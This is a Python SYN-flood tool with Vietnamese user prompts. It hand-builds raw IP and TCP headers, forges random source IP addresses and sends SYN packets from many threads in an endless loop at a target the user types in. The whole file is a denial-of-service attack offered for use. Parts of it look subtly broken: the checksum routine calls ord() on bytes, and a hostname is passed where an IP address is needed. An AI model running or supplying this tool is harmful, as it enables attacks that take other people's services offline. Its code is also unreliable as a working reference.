import re
import os
import sys
import time
import string
import signal
import http.client
import urllib.parse
from random import choice, randint
from socket import *
from struct import *
from threading import Thread, Lock

def fake_ip():
    while True:
        ips = [str(randint(0, 255)) for _ in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

def check_tgt(url):
    try:
        ip = gethostbyname(url)
    except:
        sys.exit('[-] Không thể giải quyết host: Unknown host!')
    return ip

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        Thread.__init__(self)
        self.tgt = tgt
        self.ip = ip
        self.psh = ''
        if sock is None:
            self.sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
            self.sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
        else:
            self.sock = sock
        self.lock = Lock()

    def checksum(self):
        s = 0
        for i in range(0, len(self.psh), 2):
            w = (ord(self.psh[i]) << 8) + ord(self.psh[i+1])
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def Building_packet(self):
        ihl = 5
        version = 4
        tos = 0
        tot = 40
        id = 54321
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 10
        s_addr = inet_aton(self.ip)
        d_addr = inet_aton(self.tgt)

        ihl_version = (version << 4) + ihl
        ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)

        source = 54321
        dest = 80
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        ack = 0
        psh = 0
        urg = 0
        window = htons(5840)
        check = 0
        urg_prt = 0

        offset_res = (doff << 4)
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)

        src_addr = inet_aton(self.ip)
        dst_addr = inet_aton(self.tgt)
        place = 0
        protocol = IPPROTO_TCP
        tcp_length = len(tcp_header)

        self.psh = pack('!4s4sBBH', src_addr, dst_addr, place, protocol, tcp_length)
        self.psh = self.psh + tcp_header

        tcp_checksum = self.checksum()
        tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
        packet = ip_header + tcp_header
        return packet

    def run(self):
        packet = self.Building_packet()
        try:
            self.lock.acquire()
            self.sock.sendto(packet, (self.tgt, 0))
        except KeyboardInterrupt:
            sys.exit('[-] Ngừng bởi người dùng')
        except Exception as e:
            print(e)
        finally:
            self.lock.release()

def main():
    url = input('Nhập URL mục tiêu: ')
    ip = input('Nhập IP giả (hoặc để trống để tự động tạo): ') or fake_ip()
    num_threads = int(input('Nhập số lượng luồng: '))

    print(f'[*] Bắt đầu tấn công SYN Flood: {url}')
    while True:
        try:
            for _ in range(num_threads):
                thread = Synflood(url, ip)
                thread.setDaemon(True)
                thread.start()
                thread.join()
        except KeyboardInterrupt:
            sys.exit('[-] Ngừng bởi người dùng')

if __name__ == '__main__':
    main()